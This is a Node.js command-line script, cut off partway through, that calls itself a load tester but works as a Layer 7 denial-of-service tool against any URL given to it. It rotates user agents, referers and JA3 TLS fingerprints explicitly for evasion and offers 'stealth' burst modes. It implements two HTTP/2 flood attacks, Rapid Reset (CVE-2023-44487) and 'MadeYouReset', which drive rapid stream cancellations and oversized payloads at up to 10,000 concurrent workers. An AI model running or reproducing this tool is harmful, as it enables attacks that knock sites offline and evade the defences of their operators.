#!/usr/bin/env node

const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const { URL } = require('url');
const { Client } = require('undici');
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');
const chalk = require('chalk');

// ##################################################################
// #                       CONFIGURATION DATA                       #
// ##################################################################

const USER_AGENTS = [
    // Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.1823.82",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

    // Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.5790.130 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; moto g8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
];

// JA3 Fingerprint Profiles - Real browser signatures
const JA3_PROFILES = [
    {
        name: 'Chrome 120 (Windows 10)',
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_256_CBC_SHA'
        ],
        ecdhCurve: 'X25519:P-256:P-384:P-521',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        alpnProtocols: ['h2', 'http/1.1'],
        sessionTicket: true,
        ocspStapling: true
    },
    {
        name: 'Firefox 121 (Linux)',
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA',
            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_RSA_WITH_AES_256_GCM_SHA384'
        ],
        ecdhCurve: 'X25519:P-256:P-384:P-521',
        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
        alpnProtocols: ['h2', 'http/1.1'],
        sessionTicket: false,
        ocspStapling: false
    },
    {
        name: 'Safari 17 (macOS)',
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
        ],
        ecdhCurve: 'X25519:P-256:P-384:P-521',
        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512',
        alpnProtocols: ['h2', 'http/1.1'],
        sessionTicket: true,
        ocspStapling: true
    },
    {
        name: 'Chrome 120 (Android)',
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
        ],
        ecdhCurve: 'X25519:P-256:P-384',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
        alpnProtocols: ['h2', 'http/1.1'],
        sessionTicket: true,
        ocspStapling: false
    }
];

// Burst Mode Profiles
const BURST_MODES = {
    aggressive: {
        name: 'Aggressive',
        requestsPerBurst: 50,
        thinkTimeMs: 300,
        jitterMs: 100,
        description: 'Maximum throughput - minimal delays'
    },
    normal: {
        name: 'Normal',
        requestsPerBurst: 15,
        thinkTimeMs: 1200,
        jitterMs: 800,
        description: 'Balanced approach - realistic human-like behavior'
    },
    stealth: {
        name: 'Stealth',
        requestsPerBurst: 3,
        thinkTimeMs: 3000,
        jitterMs: 2000,
        description: 'Low profile - mimics careful human browsing'
    },
    random: {
        name: 'Random',
        requestsPerBurst: null,
        thinkTimeMs: null,
        jitterMs: null,
        description: 'Fully randomized burst patterns'
    }
};

const REFERERS = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/", "https://www.twitter.com/",
    "https://www.instagram.com/", "https://www.baidu.com/", "https://www.wikipedia.org/", "https://www.yahoo.com/",
];

const ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "application/json, text/plain, */*",
];

// Complete HTTP status codes mapping
const HTTP_STATUS_CODES = {
    // 1xx Informational
    100: "Continue", 101: "Switching Protocols", 102: "Processing", 103: "Early Hints",
    // 2xx Success
    200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative Information", 204: "No Content", 205: "Reset Content", 206: "Partial Content", 207: "Multi-Status", 208: "Already Reported", 226: "IM Used",
    // 3xx Redirection
    300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other", 304: "Not Modified", 305: "Use Proxy", 307: "Temporary Redirect", 308: "Permanent Redirect",
    // 4xx Client Errors
    400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable", 407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict", 410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large", 414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable", 417: "Expectation Failed", 418: "I'm a Teapot", 421: "Misdirected Request", 422: "Unprocessable Entity", 423: "Locked", 424: "Failed Dependency", 425: "Too Early", 426: "Upgrade Required", 428: "Precondition Required", 429: "Too Many Requests", 431: "Request Header Fields Too Large", 451: "Unavailable For Legal Reasons",
    // 5xx Server Errors
    500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable", 504: "Gateway Timeout", 505: "HTTP Version Not Supported", 506: "Variant Also Negotiates", 507: "Insufficient Storage", 508: "Loop Detected", 510: "Not Extended", 511: "Network Authentication Required",
    // Cloudflare Errors
    520: "Web Server Returned an Unknown Error", 521: "Web Server Is Down", 522: "Connection Timed Out", 523: "Origin Is Unreachable", 524: "A Timeout Occurred", 525: "SSL Handshake Failed", 526: "Invalid SSL Certificate",
    // AWS Errors
    561: "Unauthorized (AWS ELB)",
    // Custom/Other
    'RESET': "Stream Reset by Server",
    999: "Request Denied (LinkedIn)",
    0: "Connection Error"
};

// Advanced Configuration
const CONFIG = {
    // Core settings
    MAX_BUFFER_SIZE: 1024 * 1024,
    MAX_DELAY_MS: 10000,
    STREAMS_PER_CONNECTION: 20,
    ATTACK_RECONNECT_MS: 100,
    MONITOR_INTERVAL_MS: 250,
    PROTOCOL_DETECTION_TIMEOUT: 5000,
    LOG_QUEUE_SIZE: 5,
    
    // Retry configuration
    MAX_RETRIES: 3,
    RETRY_DELAY_MS: 500,
    RETRY_BACKOFF_MULTIPLIER: 2.0,
    RETRYABLE_ERRORS: [
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'EHOSTUNREACH',
        'ENETUNREACH', 'ERR_HTTP2_STREAM_ERROR', 'ENOTFOUND', 'ECONNABORTED'
    ],
    RETRYABLE_STATUS_CODES: [408, 429, 502, 503, 504],
    
    // JA3 rotation
    JA3_ROTATION_INTERVAL: 25, // rotate JA3 every N requests
};

// ##################################################################
// #                       HELPER FUNCTIONS                         #
// ##################################################################

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const stripAnsi = (str) => str.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');

const formatTime = (seconds) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
};

// Get JA3 profile with rotation
function getJa3Profile(requestCount) {
    const rotationIndex = Math.floor(requestCount / CONFIG.JA3_ROTATION_INTERVAL) % JA3_PROFILES.length;
    return JA3_PROFILES[rotationIndex];
}

// Randomize cipher order
function randomizeCipherOrder(ciphers) {
    const arr = [...ciphers];
    for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr.join(':');
}

// Create TLS options from JA3 profile
function createTlsOptions(ja3Profile) {
    return {
        rejectUnauthorized: false,
        minVersion: ja3Profile.minVersion,
        maxVersion: ja3Profile.maxVersion,
        ciphers: randomizeCipherOrder(ja3Profile.ciphers),
        ecdhCurve: ja3Profile.ecdhCurve,
        sigalgs: ja3Profile.sigalgs,
        ALPNProtocols: ja3Profile.alpnProtocols || ['h2', 'http/1.1']
    };
}

// Retry with exponential backoff
async function retryWithBackoff(fn, workerId, attempt = 0) {
    try {
        return await fn();
    } catch (err) {
        const isRetryableError = CONFIG.RETRYABLE_ERRORS.includes(err.code);
        const isRetryableStatus = CONFIG.RETRYABLE_STATUS_CODES.includes(err.statusCode);
        
        if (attempt < CONFIG.MAX_RETRIES && (isRetryableError || isRetryableStatus)) {
            const delayMs = CONFIG.RETRY_DELAY_MS * Math.pow(CONFIG.RETRY_BACKOFF_MULTIPLIER, attempt);
            stats.retries = (stats.retries || 0) + 1;
            stats.retryErrors[err.code || err.statusCode] = (stats.retryErrors[err.code || err.statusCode] || 0) + 1;
            
            await new Promise(resolve => setTimeout(resolve, delayMs));
            return retryWithBackoff(fn, workerId, attempt + 1);
        }
        throw err;
    }
}

// Validate URL
const validateAndParseUrl = (urlString) => {
    try {
        const parsedUrl = new URL(urlString);
        if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
            throw new Error('Protocol must be http or https');
        }
        if (!parsedUrl.hostname) {
            throw new Error('Invalid hostname');
        }
        return parsedUrl;
    } catch (err) {
        throw new Error(`Invalid URL: ${err.message}`);
    }
};

// Validate arguments
const validateArguments = (argv) => {
    if (argv.time <= 0 || argv.time > 1440) {
        throw new Error('Time must be between 0 and 1440 minutes');
    }
    if (argv.conc <= 0 || argv.conc > 10000) {
        throw new Error('Concurrency must be between 1 and 10000');
    }
    if (!['none', 'rapid-reset', 'madeyoureset'].includes(argv.attack)) {
        throw new Error('Invalid attack mode');
    }
    if (!Object.keys(BURST_MODES).includes(argv.burstMode)) {
        throw new Error('Invalid burst mode');
    }
};

// ##################################################################
// #                       CORE LOGIC                               #
// ##################################################################

const argv = yargs(hideBin(process.argv))
    .option('url', { alias: 'u', describe: 'Target URL', type: 'string', demandOption: true })
    .option('time', { alias: 't', describe: 'Test duration in minutes', type: 'number', default: 1 })
    .option('conc', { alias: 'c', describe: 'Concurrency / threads', type: 'number', default: 50 })
    .option('burst-mode', {
        alias: 'bm',
        describe: 'Burst mode: aggressive, normal, stealth, random',
        default: 'normal',
        choices: ['aggressive', 'normal', 'stealth', 'random']
    })
    .option('enable-ja3', {
        describe: 'Enable JA3 fingerprint evasion',
        type: 'boolean',
        default: true
    })
    .option('enable-retry', {
        describe: 'Enable automatic retry on errors',
        type: 'boolean',
        default: true
    })
    .option('attack', {
        alias: 'a',
        describe: 'HTTP/2 attack mode',
        choices: ['none', 'rapid-reset', 'madeyoureset'],
        default: 'none'
    })
    .option('protocol', {
        alias: 'p',
        describe: 'Force protocols (e.g., "1.1,2,3")',
        type: 'string',
    })
    .option('adaptive-delay', {
        alias: 'ad',
        describe: 'Enable adaptive delay on blocking status codes',
        type: 'boolean',
        default: false
    })
    .help().alias('help', 'h').argv;

// Validate arguments
try {
    validateArguments(argv);
} catch (err) {
    console.error(chalk.red('Argument validation error:'), err.message);
    process.exit(1);
}

const parsedUrl = validateAndParseUrl(argv.url);
const target = {
    protocol: parsedUrl.protocol,
    host: parsedUrl.hostname,
    path: parsedUrl.pathname + parsedUrl.search,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
};
const targetUrl = `${target.protocol}//${target.host}:${target.port}`;

const durationMs = argv.time * 60 * 1000;
const concurrency = argv.conc;
const attackMode = argv.attack;
const burstMode = BURST_MODES[argv.burstMode];

// Global Stats
let isRunning = true;
let activeProtocols = [];
let activeConnections = new Set();
let requestCounter = 0;

const stats = {
    requestsSent: 0,
    responsesReceived: 0,
    totalLatency: 0,
    errors: 0,
    retries: 0,
    retryErrors: {},
    attackSent: 0,
    attackReceived: 0,
    attackErrors: 0,
    statusCounts: {},
    protocolStats: {},
    startTime: Date.now(),
};

const lastLogs = [];
const lastAttackLogs = [];
const workerDelays = new Array(concurrency).fill(0);

async function runStandardWorker(workerId, client, protocolKey) {
    let requestsInBurst = 0;
    const protocolLabel = protocolKey.toUpperCase();
    
    // Determine burst config
    let burstConfig = burstMode;
    if (argv.burstMode === 'random') {
        const modes = Object.values(BURST_MODES).filter(m => m.name !== 'Random');
        burstConfig = modes[Math.floor(Math.random() * modes.length)];
    }
    
    activeConnections.add(client);

    const sendRequest = async () => {
        if (!isRunning) return;

        if (argv.adaptiveDelay && workerDelays[workerId] > 0) {
            await new Promise(resolve => 
                setTimeout(resolve, Math.min(workerDelays[workerId], CONFIG.MAX_DELAY_MS))
            );
        }

        const headers = { 
            'User-Agent': getRandomElement(USER_AGENTS), 
            'Accept': getRandomElement(ACCEPT_HEADERS), 
            'Referer': getRandomElement(REFERERS) 
        };
        
        stats.requestsSent++;
        requestCounter++;
        const startTime = process.hrtime.bigint();

        try {
            // Use retry wrapper if enabled
            const makeRequest = async () => {
                const { statusCode, body } = await client.request({
                    path: target.path,
                    method: 'GET',
                    headers,
                });

                // Consume response body
                for await (const chunk of body) {}
                return { statusCode };
            };

            const result = argv.enableRetry 
                ? await retryWithBackoff(makeRequest, workerId)
                : await makeRequest();

            const endTime = process.hrtime.bigint();
            const latencyMs = Number(endTime - startTime) / 1e6;
            stats.responsesReceived++;
            stats.totalLatency += latencyMs;
            
            const pStats = stats.protocolStats[protocolKey];
            pStats.responses++;
            pStats.statuses[result.statusCode] = (pStats.statuses[result.statusCode] || 0) + 1;

            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.green(result.statusCode)} (${chalk.yellow(latencyMs.toFixed(2) + 'ms')})`);
            
            if (argv.adaptiveDelay) {
                switch (result.statusCode) {
                    case 401: case 403: case 429: case 431: case 451:
                        workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, workerDelays[workerId] + 150);
                        break;
                    case 400: case 406: case 412: case 422:
                        workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, workerDelays[workerId] + 75);
                        break;
                    default:
                        if (result.statusCode < 400) {
                            workerDelays[workerId] = Math.max(0, workerDelays[workerId] - 50);
                        }
                }
            }

        } catch (err) {
            stats.errors++;
            stats.protocolStats[protocolKey].statuses[0] = (stats.protocolStats[protocolKey].statuses[0] || 0) + 1;
            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.red('ERROR')} (${err.code || 'N/A'})`);
        } finally {
            if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
            scheduleNext();
        }
    };
    
    const scheduleNext = () => {
        if (!isRunning) return;
        requestsInBurst++;
        
        // Apply burst mode logic
        if (requestsInBurst >= burstConfig.requestsPerBurst) {
            requestsInBurst = 0;
            const thinkTime = burstConfig.thinkTimeMs + (Math.random() * burstConfig.jitterMs);
            setTimeout(sendRequest, thinkTime);
        } else {
            setImmediate(sendRequest);
        }
    };
    
    sendRequest();
}

// HTTP/2 Attack Worker
function startHttp2AttackWorker() {
    if (!isRunning) return;
    
    const ja3Profile = argv.enableJa3 ? getJa3Profile(requestCounter) : JA3_PROFILES[0];
    const tlsOptions = createTlsOptions(ja3Profile);
    
    const client = http2.connect(targetUrl, tlsOptions);
    activeConnections.add(client);

    const reconnect = () => {
        if (!client.destroyed) {
            try {
                client.destroy();
            } catch (e) {
                // Ignore
            }
        }
        if (isRunning) setTimeout(startHttp2AttackWorker, CONFIG.ATTACK_RECONNECT_MS);
    };

    client.on('goaway', reconnect);
    client.on('error', reconnect);
    client.on('close', reconnect);

    client.on('connect', () => {
        for (let i = 0; i < CONFIG.STREAMS_PER_CONNECTION; i++) { 
            if (attackMode === 'rapid-reset') sendRapidReset(client);
            if (attackMode === 'madeyoureset') sendMadeYouReset(client);
        }
    });
}

// Rapid Reset
function sendRapidReset(client) {
    if (!isRunning || client.destroyed || client.closing) return;
    const headers = { ':method': 'GET', ':path': target.path, ':scheme': 'https', ':authority': target.host };
    stats.attackSent++;
    
    try {
        const stream = client.request(headers);
        stream.on('response', (h) => {
            stats.attackReceived++;
            const statusCode = h[':status'];
            stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
            lastAttackLogs.push(`[Rapid Reset] -> ${chalk.yellow(statusCode)}`);
            if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
        });
        stream.on('error', () => {
            stats.attackErrors++;
            stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
        });
        setImmediate(() => {
            if (!stream.destroyed) stream.close(http2.constants.NGHTTP2_CANCEL);
        });
    } catch (err) {
        stats.attackErrors++;
    }
}

// MadeYouReset
function sendMadeYouReset(client) {
    if (!isRunning || client.destroyed || client.closing) return;
    const headers = { ':method': 'POST', ':path': target.path, ':scheme': 'https', ':authority': target.host };
    stats.attackSent++;
    
    try {
        const stream = client.request(headers);
        stream.on('response', (h) => {
            stats.attackReceived++;
            const statusCode = h[':status'];
            stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
            lastAttackLogs.push(`[MadeYouReset] -> ${chalk.yellow(statusCode)}`);
            if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
        });
        stream.on('error', (err) => {
            if (err.code === 'ERR_HTTP2_STREAM_ERROR') {
                stats.statusCounts['RESET'] = (stats.statusCounts['RESET'] || 0) + 1;
                lastAttackLogs.push(`[MadeYouReset] -> ${chalk.green('SUCCESS')}`);
                if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
            } else {
                stats.attackErrors++;
                stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
            }
        });
        setImmediate(() => {
            if (stream.destroyed) return;
            try {
                const remoteWindowSize = stream.state.remoteWindowSize;
                const payloadSize = Math.min(remoteWindowSize + 1, CONFIG.MAX_BUFFER_SIZE);
                if (payloadSize > 0) {
                    const oversizedPayload = Buffer.alloc(payloadSize);
                    stream.end(oversizedPayload);
                } else {
                    stream.end();
                }
            } catch (e) {
                stats.attackErrors++;
                if (!stream.destroyed) {
                    try {
                        stream.destroy();
                    } catch (e) {
                        // Ignore
                    }
                }
            }
        });
    } catch (err) {
        stats.attackErrors++;
    }
}

// Enhanced Monitor Display
function updateMonitor() {
    console.clear();
    const elapsedSeconds = (Date.now() - stats.startTime) / 1000;
    const timeRemaining = Math.max(0, (durationMs / 1000) - elapsedSeconds);

    console.log(chalk.cyan('════════════════════════════════════════════════════════════════'));
    console.log(chalk.cyan.bold('          ⚡️ PV NodeJS Layer 7 - Enhanced Edition ⚡️         '));
    console.log(chalk.cyan('════════════════════════════════════════════════════════════════'));
    
    if (attackMode !== 'none') {
        console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
        console.log(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
        console.log('');
        const attackName = attackMode === 'rapid-reset' ? 'Rapid Reset (CVE-2023-44487)' : 'MadeYouReset';
        const totalResetsAndErrors = (stats.statusCounts['RESET'] || 0) + stats.attackErrors;
        console.log(chalk.bgRed.white.bold(` HTTP/2 Attack ACTIVE: ${attackName} `));
        console.log(chalk.white.bold('Attack Streams Sent: ') + chalk.magenta(stats.attackSent));
        console.log(chalk.white.bold('Attack Responses Rcvd: ') + chalk.magenta(stats.attackReceived));
        console.log(chalk.white.bold('Attack Errors/Resets: ') + chalk.red(totalResetsAndErrors));

    } else {
        console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
        console.log(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
        console.log(chalk.white.bold('Burst Mode: ') + chalk.cyan(burstMode.name + ' - ' + burstMode.description));
        console.log('');
        
        const rps = (stats.requestsSent / elapsedSeconds || 0).toFixed(2);
        const avgLatency = (stats.totalLatency / stats.responsesReceived || 0).toFixed(2);
        
        console.log(chalk.white.bold('═══ Load Testing Metrics ═══'));
        console.log(chalk.white.bold('Requests Sent: ') + chalk.blue(stats.requestsSent));
        console.log(chalk.white.bold('Responses Received: ') + chalk.blue(stats.responsesReceived));
        console.log(chalk.white.bold('Requests/Second: ') + chalk.magenta(rps));
        console.log(chalk.white.bold('Avg Latency: ') + chalk.yellow(`${avgLatency} ms`));
        
        if (argv.enableRetry) {
            console.log(chalk.white.bold('Retries: ') + chalk.cyan(stats.retries));
            if (Object.keys(stats.retryErrors).length > 0) {
                const retryErrorSummary = Object.entries(stats.retryErrors)
                    .map(([k, v]) => `${k}:${v}`)
                    .join(', ');
                console.log(chalk.white.bold('Retry Errors: ') + chalk.yellow(retryErrorSummary));
            }
        }
        
        if (argv.enableJa3) {
            const currentJa3 = getJa3Profile(requestCounter);
            console.log(chalk.white.bold('Current JA3 Profile: ') + chalk.magenta(currentJa3.name));
        }
        
        console.log(chalk.white.bold('Errors: ') + chalk.red(stats.errors));
    }

    console.log('');
    console.log(chalk.white.bold('Response Status Counts:'));
    
    if (attackMode !== 'none') {
        const sortedStatuses = Object.keys(stats.statusCounts).sort();
        if (sortedStatuses.length === 0) {
            console.log(chalk.gray('  (waiting...)'));
        } else {
            sortedStatuses.forEach(code => {
                const color = code === 'RESET' ? chalk.green : chalk.red;
                const message = HTTP_STATUS_CODES[code] || 'Unknown';
                console.log(`  ${color(code)} (${message}): ${chalk.blue(stats.statusCounts[code])}`);
            });
        }
    } else {
        if (Object.keys(stats.protocolStats).length === 0 || activeProtocols.length === 0) {
            console.log(chalk.gray('  (waiting...)'));
        } else {
            const allStatusCodes = new Set();
            activeProtocols.forEach(p => {
                Object.keys(stats.protocolStats[p].statuses).forEach(code => allStatusCodes.add(code));
            });

            const sortedStatuses = Array.from(allStatusCodes).sort((a, b) => b - a);
            
            if (sortedStatuses.length === 0) {
                console.log(chalk.gray('  (waiting...)'));
            } else {
                const COLUMN_WIDTH = 30;
                let header = '';
                activeProtocols.forEach(p => {
                    const title = `${p.toUpperCase()}`;
                    const styledTitle = chalk.white.bold.underline(title);
                    const visibleLength = stripAnsi(styledTitle).length;
                    header += styledTitle + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
                });
                console.log(header);

                sortedStatuses.forEach(code => {
                    let row = '';
                    activeProtocols.forEach(protoKey => {
                        const pStats = stats.protocolStats[protoKey];
                        const count = pStats.statuses[code];
                        let cellText = '';
                        if (count) {
                            const color = String(code).startsWith('2') ? chalk.green : String(code).startsWith('3') ? chalk.yellow : chalk.red;
                            cellText = `${color(code)}: ${chalk.blue(count)}`;
                        }
                        const visibleLength = stripAnsi(cellText).length;
                        row += cellText + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
                    });
                    console.log(row);
                });
            }
        }
    }
    
    console.log('');
    const logsToShow = attackMode !== 'none' ? lastAttackLogs : lastLogs;
    console.log(chalk.white.bold('Event Log (last 5):'));
    if (logsToShow.length === 0) console.log(chalk.gray('  (waiting...)'));
    else logsToShow.forEach(log => console.log(`  ${log}`));

    console.log(chalk.cyan('════════════════════════════════════════════════════════════════'));
}

// Graceful shutdown
async function gracefulShutdown() {
    console.log(chalk.yellow('\n🛑 Initiating graceful shutdown...'));
    isRunning = false;
    
    for (const conn of activeConnections) {
        try {
            if (conn.destroy) conn.destroy();
        } catch (e) {
            // Ignore
        }
    }
    activeConnections.clear();
}

// Main execution
async function main() {
    console.log(chalk.green('🚀 Starting enhanced load test...'));
    console.log(chalk.yellow(`📍 Target: ${argv.url}`));
    console.log(chalk.yellow(`⏱️  Duration: ${argv.time} min | 🔄 Concurrency: ${argv.conc}`));
    console.log(chalk.yellow(`💥 Attack: ${attackMode} | 📊 Burst Mode: ${burstMode.name}`));
    console.log(chalk.yellow(`🔐 JA3 Evasion: ${argv.enableJa3 ? 'ON' : 'OFF'} | 🔁 Retry: ${argv.enableRetry ? 'ON' : 'OFF'}`));
    console.log('');

    if (attackMode !== 'none') {
        activeProtocols = ['h2'];
        stats.protocolStats['h2'] = { responses: 0, statuses: {} };
    } else if (argv.protocol) {
        console.log(chalk.cyan(`Forcing protocols: ${argv.protocol}`));
        const protocolMap = { '1.1': 'h1', '2': 'h2', '3': 'h3' };
